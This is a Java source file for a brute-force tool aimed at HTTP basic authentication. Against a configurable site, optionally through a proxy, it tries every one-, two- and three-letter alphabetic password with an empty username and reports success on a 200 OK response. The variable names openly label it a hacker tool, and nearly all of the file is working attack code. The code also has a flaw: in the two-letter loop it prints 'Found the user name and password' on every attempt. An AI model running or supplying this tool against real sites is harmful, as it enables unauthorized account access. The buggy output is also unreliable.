


import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.UsernamePasswordCredentials;
import org.apache.commons.httpclient.cookie.CookiePolicy;
import org.apache.commons.httpclient.methods.GetMethod;




public class  BruteForce{

    static final String LOGON_SITE_HACKER = BruteForcePropertyHelper.getProperty("logonSite");
    static final int    LOGON_PORT_HACKER = Integer.valueOf(BruteForcePropertyHelper.getProperty("logonPort")).intValue();

    static final int    USE_PROXY_SERVER  = Integer.valueOf(BruteForcePropertyHelper.getProperty("useProxyServer")).intValue();
    static final int    PROXY_PORT        = Integer.valueOf(BruteForcePropertyHelper.getProperty("proxyPort")).intValue();

    static final String PROXY_SERVER      = BruteForcePropertyHelper.getProperty("proxyServer");
    static final String PROXY_USENAME     = BruteForcePropertyHelper.getProperty("proxyUserName");
    static final String PROXY_PASSWORD    = BruteForcePropertyHelper.getProperty("proxypassword");

    static final String GET_METHOD_HACKER = BruteForcePropertyHelper.getProperty("getMethod");
    static final int    NUMBER_OF_GETS_BEFORE_RELEASE = Integer.valueOf(BruteForcePropertyHelper.getProperty("numberOfGetsBeforeReleaseConnection")).intValue();

    static final String[] cValidChars	 = {"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"};

    public BruteForce() {
        super();
    }




    public static void main (String[] args) throws Exception {

		String	statusLine = " ";
		int		count = 0;
		int		firstLetterIndex = 0;
		int		secondLetterIndex = 0;
		int		thirdLetterIndex = 0;
		int		divValue = 0;




		String userName = "";
		String password = "";


        HttpClient client = new HttpClient();

		

        if (USE_PROXY_SERVER == 1) {
  			client.getHostConfiguration().setProxy(PROXY_SERVER, PROXY_PORT);
  			client.getState().setProxyCredentials(null, null, new UsernamePasswordCredentials(PROXY_USENAME, PROXY_PASSWORD));

        }

        client.getState().setCookiePolicy(CookiePolicy.COMPATIBILITY);
        client.getHostConfiguration().setHost(LOGON_SITE_HACKER, LOGON_PORT_HACKER, "http");
        GetMethod getMethod = new GetMethod(GET_METHOD_HACKER);


		

		count = 0;

		for (int f = 0; f < 52; f++) {

			firstLetterIndex = f;

			password = cValidChars[firstLetterIndex];
			System.out.println("Count: "+ count + " First Index: "+ firstLetterIndex+ " password: "+ password);

	        client.getState().setCredentials(null, null, new UsernamePasswordCredentials(userName, password));
	        client.executeMethod(getMethod);
	        statusLine = getMethod.getStatusLine().toString();


			if (statusLine.compareTo("HTTP/1.1 200 OK") == 0) {
				System.out.println("Found the user name and password for the site. The username is: "+ userName+ " and the password is: "+ password);
				System.exit(0);
			}
	    }


		
		count = 0;

		for (int g = 0; g < 52; g++) {

			firstLetterIndex = g;

			for (int h = 0; h < 52; h++) {

			secondLetterIndex = h;

			password = cValidChars[firstLetterIndex]+ cValidChars[secondLetterIndex];

				System.out.println("Count: "+ count+ " First Index: "+ firstLetterIndex+ " Second Index: "+ secondLetterIndex+ cValidChars[firstLetterIndex]+ cValidChars[secondLetterIndex]+ cValidChars[thirdLetterIndex]+ " password: "+ password);

		        client.getState().setCredentials(null, null, new UsernamePasswordCredentials(userName, password));

				++count;

				divValue = count % NUMBER_OF_GETS_BEFORE_RELEASE;


				if (divValue == 0) {

					System.out.println("Count: "+ count+ " Div Value: "+ divValue + " Releasing the connection and getting new one");
					getMethod.releaseConnection();
					getMethod = null;
					getMethod = new GetMethod(GET_METHOD_HACKER);

				}

		        client.executeMethod(getMethod);

		        statusLine = getMethod.getStatusLine().toString();
				System.out.println("Found the user name and password for the site. The username is: "+ userName+ " and the password is: "+ password);

				if (statusLine.compareTo("HTTP/1.1 200 OK") == 0) {
					System.out.println("Found the user name and password for the site. The username is: "+ userName+ " and the password is: "+ password);

					System.exit(0);
				}
		    }

		}

		
		

		getMethod.releaseConnection();
		getMethod = null;
		getMethod = new GetMethod(GET_METHOD_HACKER);

		count = 0;
		for (int i = 0; i < 52; i++) {

			firstLetterIndex = i;

			for (int j = 0; j < 52; j++) {

				secondLetterIndex = j;

				for (int k = 0; k < 52; k++) {

					thirdLetterIndex = k;

					password = cValidChars[firstLetterIndex]+ cValidChars[secondLetterIndex]+ cValidChars[thirdLetterIndex];
					System.out.println("Count: "+ count+ " First Index: "+ firstLetterIndex+ " Second Index: "+ secondLetterIndex+ " Third Index: "+ thirdLetterIndex+ "  "+ cValidChars[firstLetterIndex]+ cValidChars[secondLetterIndex]+ cValidChars[thirdLetterIndex]+ " password: "+ password);

			        client.getState().setCredentials(null, null, new UsernamePasswordCredentials(userName, password));

					++count;

					divValue = count % NUMBER_OF_GETS_BEFORE_RELEASE;


					if (divValue == 0) {

						System.out.println("Count: "+ count+ " Div Value: "+ divValue+ " Releasing the connection and getting new one");
						getMethod.releaseConnection();
						getMethod = null;
						getMethod = new GetMethod(GET_METHOD_HACKER);

					}

			        client.executeMethod(getMethod);
			        statusLine = getMethod.getStatusLine().toString();

					if (statusLine.compareTo("HTTP/1.1 200 OK") == 0) {
						System.out.println("Found the user name and password for the site. The username is: "+ userName+ " and the password is: "+ password);
						System.exit(0);
					}
			    }
			}
		}
    }
}
